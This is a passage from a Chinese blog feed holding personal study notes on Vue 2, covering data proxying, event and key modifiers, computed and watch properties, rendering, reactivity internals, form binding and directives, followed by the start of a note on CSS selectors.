&lt;/h3&gt;&lt;p&gt;何为数据代理？通过一个对象来修改另一个对象。&lt;/p&gt;
&lt;p&gt;例如，obj={x:100}&lt;/p&gt;
&lt;p&gt;obj2={y:200}&lt;/p&gt;
&lt;p&gt;使用Object.defineProperty方法，设置obj2的x属性get和set方法与obj绑定&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-vue" data-lang="vue"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Object.&lt;span style="color:#a6e22e"&gt;defineProperty&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;obj2&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;x&amp;#39;&lt;/span&gt;,{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;get&lt;/span&gt;(){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;obj&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;x&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;},
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;set&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;value&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;obj&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;x&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;value&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;})
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在script标签里设置的data属性值，绑定的是vm中的_data属性&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/16467060352831646706034381.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vue中的数据代理：&lt;/strong&gt;
通过vm对象来代理data对象中属性的操作（读/写）
&lt;strong&gt;Vue中数据代理的好处：&lt;/strong&gt;
更加方便的操作data中的数据
&lt;strong&gt;基本原理：&lt;/strong&gt;
通过0bject.defineProperty()把data对象中所有属性添加到vm上。为每一个添加到vm上的属性，都指定一个getter/setter。在getter/setter内部去操作（读/写）data中对应的属性。&lt;/p&gt;
&lt;h2 id="事件处理"&gt;事件处理
&lt;/h2&gt;&lt;p&gt;事件的基本使用：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用&lt;strong&gt;v-on:xxx&lt;/strong&gt; 或 &lt;strong&gt;@xxx&lt;/strong&gt; 绑定事件，其中xxx是事件名；&lt;/li&gt;
&lt;li&gt;事件的回调需要配置在methods对象中，最终会在vm上；&lt;/li&gt;
&lt;li&gt;methods中配置的函数，不要用箭头函数！否则this就不是vm了；&lt;/li&gt;
&lt;li&gt;methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；&lt;/li&gt;
&lt;li&gt;@click=&amp;ldquo;demo&amp;rdquo; 和 @click=&amp;ldquo;demo($event)&amp;ldquo;效果一致，但后者可以传参；&lt;/li&gt;
&lt;li&gt;@click=&amp;ldquo;yyy&amp;rdquo;，其中yyy可以写一些简单的语句&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="事件修饰符"&gt;事件修饰符
&lt;/h2&gt;&lt;p&gt;使用示例&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-html" data-lang="html"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;a&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;href&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;xxx&amp;#34;&lt;/span&gt; &lt;span style="color:#960050;background-color:#1e0010"&gt;@&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;click&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;prevent&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;showInfo&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;event事件中可以使用e.preventDefault()阻止默认事件，vue中可以使用@click.&lt;strong&gt;prevent&lt;/strong&gt;=&amp;lsquo;xxx&amp;rsquo;的修饰方式使用该方法。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;扫盲：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;事件冒泡 ：当一个元素接收到事件的时候 会把他接收到的事件传给自己的父级，一直到window 。（注意这里传递的仅仅是事件 并不传递所绑定的事件函数。所以如果父级没有绑定事件函数，就算传递了事件 也不会有什么表现 但事件确实传递了。）&lt;/p&gt;
&lt;p&gt;事件捕获和事件冒泡：DOM2级事件’规定的事件流包含3个阶段，&lt;strong&gt;事件捕获阶段、处于目标阶段、事件冒泡阶段&lt;/strong&gt;。首先发生的事件捕获为截获事件提供机会，然后是实际的目标接收事件，最后一个阶段是事件冒泡阶段，可以在这个阶段对事件做出响应。https://www.cnblogs.com/christineqing/p/7607113.html&lt;/p&gt;
&lt;p&gt;&lt;img src="https://images2017.cnblogs.com/blog/1174211/201712/1174211-20171201225153933-1205737719.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vue中的事件修饰符：&lt;/strong&gt;
1.prevent：阻止默认事件（常用）；
2.stop：阻止事件冒泡（常用）；
3.once：事件只触发一次（常用）；
4.capture：使用事件的捕获模式（捕获阶段就执行函数）；
5.self：只有event.target是当前操作的元素时才触发事件；
6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕（比如scroll和wheel事件，wheel回调函数很麻烦的时候，可以使用passive优先执行滚轮默认行为）；&lt;/p&gt;
&lt;h2 id="键盘事件"&gt;键盘事件
&lt;/h2&gt;&lt;p&gt;使用方法示例&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-vue" data-lang="vue"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;input&lt;/span&gt; &lt;span style="color:#f92672"&gt;@keydown.enter&lt;/span&gt;&lt;span style="color:#e6db74"&gt;=&amp;#34;showInfo&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Vue中常用的按键别名：
回车 =&amp;gt; enter
删除 =&amp;gt; delete（捕获“删除”和“退格）
退出 =&amp;gt; esc
空格 =&amp;gt; space
换行 =&amp;gt; tab（特殊，必须配合keydown去使用）
上 =&amp;gt; up
下 =&amp;gt; down
左 =&amp;gt; left
右 =&amp;gt; right&lt;/li&gt;
&lt;li&gt;Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要keyab-case（驼峰命名改为短横线命名）&lt;/li&gt;
&lt;li&gt;系统修饰键（用法特殊）：ctrl、alt、shift、meta&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。&lt;/li&gt;
&lt;li&gt;配合keydown使用：正常触发事件。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;也可以使用keyCode去指定具体的按键（不推荐）&lt;/li&gt;
&lt;li&gt;Vue.config.keyCodes.自定义键名 = 键去定制按键别名&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="小tips"&gt;小tips
&lt;/h3&gt;&lt;p&gt;修饰符可以连续写比如&lt;code&gt;@click.prevent.stop&lt;/code&gt;和&lt;code&gt;@keydown.ctrl.y&lt;/code&gt;&lt;/p&gt;
&lt;h2 id="计算属性"&gt;计算属性
&lt;/h2&gt;&lt;p&gt;vue中绑定的数据修改时，vue会重新解析模板。&lt;/p&gt;
&lt;p&gt;使用示例&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;computed{
fullName:{
get(){
return firstName + lastName
}
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;计算属性&lt;strong&gt;定义&lt;/strong&gt;：根据&lt;strong&gt;已有的属性&lt;/strong&gt;进行一些计算加工生成的新属性就叫计算属性。使用配置项&lt;code&gt;computed&lt;/code&gt;，计算属性最终会在&lt;code&gt;vm&lt;/code&gt;对象身上，但是不在&lt;code&gt;_data&lt;/code&gt;里。&lt;/p&gt;
&lt;p&gt;原理：底层借助了Objcet.defineproperty方法提供的gtter和setter。&lt;/p&gt;
&lt;p&gt;计算属性的值使用getter调用，多次调用会使用&lt;strong&gt;缓存&lt;/strong&gt;，getter什么时候调用？&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;初次读取计算属性时&lt;/li&gt;
&lt;li&gt;所依赖的数据发生改变时&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;如果计算属性要被修改，必须使用set函数响应修改，切记set函数中要修改依赖的属性&lt;/p&gt;
&lt;h3 id="简写"&gt;简写
&lt;/h3&gt;&lt;p&gt;确定只读取不修改可以使用简写模式。示例&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;fullNmae(){
return
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id="监视属性"&gt;监视属性
&lt;/h2&gt;&lt;p&gt;配置对象&lt;code&gt;watch:{}&lt;/code&gt;，代码示例&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;watch：{
isHot:{
immediate:true，//初始化时让handler调用一下
//handler什么时候调用？当isHot发生改变时。
handler(newValue,oldValue){
console.log(&amp;#34;isHot被修改了&amp;#39;,newValue,oldValue)
}
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;监视属性也可以监视&lt;strong&gt;计算属性&lt;/strong&gt;，监视属性的另一种写法&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;vm.$wathc(&amp;#39;变量名&amp;#39;,{配置项同上
})
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id="深度监视"&gt;深度监视
&lt;/h2&gt;&lt;p&gt;Vue中的watch默认不监测对象内部值的改变，配置&lt;code&gt;deep:true&lt;/code&gt;可以监测对象内部值的改变。Vue自身可以监测对象内部值的改变，但是Vue提供的watch默认不可以，使用watch的时候根据数据的具体结构，决定是否采用深度监视。&lt;/p&gt;
&lt;p&gt;有简写形式&lt;/p&gt;
&lt;h2 id="监视属性vs计算属性"&gt;监视属性vs计算属性
&lt;/h2&gt;&lt;p&gt;还是要看具体需求。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;computed能完成的功能，watch都可以完成。&lt;/li&gt;
&lt;li&gt;watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;两个重要的小原则：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。&lt;/li&gt;
&lt;li&gt;所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等），最好写成箭函数，这样this的指向才是vm或组件实例对象。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="绑定样式"&gt;绑定样式
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;class样式
写法：class=&amp;ldquo;xxx&amp;rdquo; xxx可以是字符串、对象、数组。
字符串写法适用于：类名不确定，要动态获取。
对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。&lt;/li&gt;
&lt;li&gt;style样式
:style=&amp;quot;{fontSize：xxx}&amp;ldquo;其中xxx是动态值。
:style=&amp;quot;[a,b]&amp;ldquo;其中a、b是样式对象。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="条件渲染"&gt;条件渲染
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;v-if&lt;/code&gt;写法：
(1).v-if=&amp;ldquo;表达式&amp;rdquo;
(2)v-else-if=&amp;ldquo;表达式&amp;rdquo;
(3).v-else=&amp;ldquo;表达式&amp;rdquo;
适用于：切换频率&lt;strong&gt;较低&lt;/strong&gt;的场景。
特点：不展示的DOM元素直接被移除。
注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v-show&lt;/code&gt;写法：v-show=&amp;ldquo;表达武&amp;rdquo;
适用于：切换频率&lt;strong&gt;较高&lt;/strong&gt;的场景。
特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉。&lt;/p&gt;
&lt;p&gt;备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。&lt;/p&gt;
&lt;p&gt;还有一个点if和template配合使用保持原来的html结构&lt;/p&gt;
&lt;h2 id="列表渲染"&gt;列表渲染
&lt;/h2&gt;&lt;p&gt;v-for指令：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用于展示列表数据&lt;/li&gt;
&lt;li&gt;语法：v-for=&amp;quot;(item,index)in xxx&amp;rsquo;&amp;quot;:key=&amp;ldquo;yyy&amp;rdquo;&lt;/li&gt;
&lt;li&gt;可遍历：数组、对象、字符串（用的很少）、指定次数(用的很少)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;key的作用和原理&lt;/p&gt;
&lt;p&gt;面试题：react、vue中的key有什么作用？(key的内部原理)&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;虚拟DoM中key的作用：
key是虚拟DoM对象的标识，当数据发生变化时，Vue会根据&lt;strong&gt;新数据&lt;/strong&gt;生成&lt;strong&gt;新的虚拟DoM&lt;/strong&gt;,随后Vue进行&lt;strong&gt;新虚拟DoM&lt;/strong&gt;与&lt;strong&gt;旧虚拟DoM&lt;/strong&gt;的差异比较，比较规则如下：&lt;/p&gt;
&lt;p&gt;对比规则：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;旧虚拟DoM中找到了与新虚拟DoM相同的key。&lt;/p&gt;
&lt;p&gt;若虚拟DoM中内容没变，直接使用之前的真实DoM！&lt;/p&gt;
&lt;p&gt;若虚拟DoM中内容变了，则生成新的真实DoM,随后替换掉页面中之前的真实D0M。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;旧拟DoM中未找到与新虚拟DoM相同的key&lt;/p&gt;
&lt;p&gt;创建新的真实DOM,随后渲染到到页面。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用index作为key可能会发的问题：
若对数据进行：逆序添加、逆序明除等破坏顺序操作，会产生没有必要的真实DoM更新==&amp;gt;界面效果没问题，但效率低。&lt;/p&gt;
&lt;p&gt;如果结构中还包含输入类的DoM，会产生错误DoM更新==&amp;gt;界面而有问题。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;开发中如何选择key？
最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值。
如果不存在对数据的逆序添加、逆序则除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/06/15/684dd822cdc7d26d5e587df6a93c9a0d.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="列表排序过滤"&gt;列表排序&amp;amp;过滤
&lt;/h2&gt;&lt;p&gt;能用computed的就不用watch&lt;/p&gt;
&lt;h2 id="监测数据的原理"&gt;监测数据的原理
&lt;/h2&gt;&lt;h3 id="对象的检测"&gt;对象的检测
&lt;/h3&gt;&lt;p&gt;首先对data数据进行加工，设置响应式的getter和setter，大概的核心代码如下&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-javascript" data-lang="javascript"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;let&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;data&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;name&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;xx&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;address&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;dd&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;const&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;obs&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Observer&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;data&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;let&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;vm&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;{}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;vm&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;_data&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;data&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;obs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Observer&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;obj&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//汇总对象里的属性形成一个数组
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;keys&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Object.&lt;span style="color:#a6e22e"&gt;keys&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;obj&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//遍历
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;keys&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;forEach&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;k&lt;/span&gt; =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Object.&lt;span style="color:#a6e22e"&gt;defineProperties&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;this&lt;/span&gt;,&lt;span style="color:#a6e22e"&gt;k&lt;/span&gt;,{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;get&lt;/span&gt;(){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;obj&lt;/span&gt;[&lt;span style="color:#a6e22e"&gt;k&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; },
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;set&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;val&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//Vue重新模板解析
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;obj&lt;/span&gt;[&lt;span style="color:#a6e22e"&gt;k&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;val&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; })
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; });
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;并且Vue底层使用递归的方式对所有嵌套的对象属性都进行了数据监测方法的加工。&lt;/p&gt;
&lt;p&gt;Vue提供了一个API的set方法&lt;code&gt;Vue.set()&lt;/code&gt;或&lt;code&gt;vm.$set()&lt;/code&gt;，可以为已经创建的对象添加响应式的属性。传入参数列表：target，key，val。局限性：&lt;strong&gt;target对象不能是Vue实例或者Vue实例的根数据对象&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id="数据的检测"&gt;数据的检测
&lt;/h3&gt;&lt;p&gt;通过&lt;strong&gt;包裹&lt;/strong&gt;数组中更新元素的方法实现，本质上做了两件事&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;调用原型中的数组更新方法&lt;/li&gt;
&lt;li&gt;Vue重新进行模板解析，更新页面&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Vue包裹的7种方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;push()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pop()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;shift()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;unshift()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;splice()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sort()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;reverse()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;也可以使用Vue提供的API：&lt;code&gt;Vue.set()&lt;/code&gt;或&lt;code&gt;vm.$set()&lt;/code&gt;&lt;/p&gt;
&lt;h2 id="收集表单数据"&gt;收集表单数据
&lt;/h2&gt;&lt;p&gt;根据&lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt;标签的类型不同，v-model收集的值也不同，分为以下几种情况&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;text类型。收集的是value属性&lt;/li&gt;
&lt;li&gt;radio类型。收集的同样是value属性，但是需要给标签配置value值并成组&lt;/li&gt;
&lt;li&gt;checkbox类型。如果没有配置value属性，收集的是选项框的&lt;code&gt;checked&lt;/code&gt;属性。如果配置了value属性，根据v-model绑定属性的初始值不同有两种情况：1.绑定属性初始值为&lt;strong&gt;非数组&lt;/strong&gt;，收集的是checked属性。2.绑定属性为数组，收集的就是value组成的数组&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;v-model的三个常用修饰符：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;lazy。输入框失去焦点时收集数据&lt;/li&gt;
&lt;li&gt;number。输入字符串为有效数字&lt;/li&gt;
&lt;li&gt;trim。过滤首尾空格&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="过滤器"&gt;过滤器
&lt;/h2&gt;&lt;p&gt;对数据进行格式化显示。语法：&lt;/p&gt;
&lt;p&gt;注册过滤器：全局注册Vue.filter(name,callback) 或 局部注册new Vue{filters{}}&lt;/p&gt;
&lt;p&gt;使用过滤器：{{xxx | filter}} 或 v-bind:属性 = xxx | filter&lt;/p&gt;
&lt;p&gt;过滤器可以接受多个参数，第一个默认是管道符前的数据。多个管道符可以串联（按顺序调用）&lt;/p&gt;
&lt;h2 id="内置指令"&gt;内置指令
&lt;/h2&gt;&lt;p&gt;v-bind：单项绑定解析表达式可以简写为&lt;code&gt;:xxx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;v-model：双向绑定数据&lt;/p&gt;
&lt;p&gt;v-for：遍历数组/字符串/对象&lt;/p&gt;
&lt;p&gt;v-on：绑定事件监听，可以简写为&lt;code&gt;@&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;v-if（v-else）：条件渲染&lt;/p&gt;
&lt;p&gt;v-show：控制节点是否展示&lt;/p&gt;
&lt;p&gt;v-test：所在节点渲染文本内容。和插值语法区别，前者会直接替换掉节点里的内容，插值语法不会。&lt;/p&gt;
&lt;p&gt;v-html：向所在节点渲染包含html结构的内容。指令可以识别html结构。但是要注意XSS攻击&lt;/p&gt;</description></item><item><title>CSS学习</title><link>https://www.braindance.top/posts/css%E5%AD%A6%E4%B9%A0/</link><pubDate>Tue, 15 Feb 2022 09:28:06 +0800</pubDate><guid>https://www.braindance.top/posts/css%E5%AD%A6%E4%B9%A0/</guid><description>&lt;h3 id="选择器"&gt;选择器
&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;element&lt;/th&gt;
&lt;th&gt;p&lt;/th&gt;
&lt;th&gt;选择所有 &amp;lt;p&amp;gt; 元素。&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;element.class&lt;/td&gt;
&lt;td&gt;p.intro&lt;/td&gt;
&lt;td&gt;选择 class=&amp;ldquo;intro&amp;rdquo; 的所有 &amp;lt;p&amp;gt; 元素。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;element,element&lt;/td&gt;
&lt;td&gt;div, p&lt;/td&gt;
&lt;td&gt;选择所有 &amp;lt;div&amp;gt; 元素和所有 &amp;lt;p&amp;gt; 元素。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;element element&lt;/td&gt;
&lt;td&gt;div p&lt;/td&gt;
&lt;td&gt;选择 &amp;lt;div&amp;gt; 元素内的所有 &amp;lt;p&amp;gt; 元素。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;element&amp;gt;element&lt;/td&gt;
&lt;td&gt;div &amp;gt; p&lt;/td&gt;
&lt;td&gt;选择父元素是 &amp;lt;div&amp;gt; 的所有 &amp;lt;p&amp;gt; 元素。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;element+element&lt;/td&gt;
&lt;td&gt;div + p&lt;/td&gt;
&lt;td&gt;选择紧跟 &amp;lt;div&amp;gt; 元素的首个 &amp;lt;p&amp;gt; 元素。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;element1~element2&lt;/td&gt;
&lt;td&gt;p ~ ul&lt;/td&gt;
&lt;td&gt;选择前面有 &amp;lt;p&amp;gt; 元素的每个 &amp;lt;ul&amp;gt; 元素。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id="选择器的权重"&gt;选择器的权重
&lt;/h3&gt;&lt;p&gt;选择器权重（从上往下优先级变低）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;内联样式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;id选择器&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
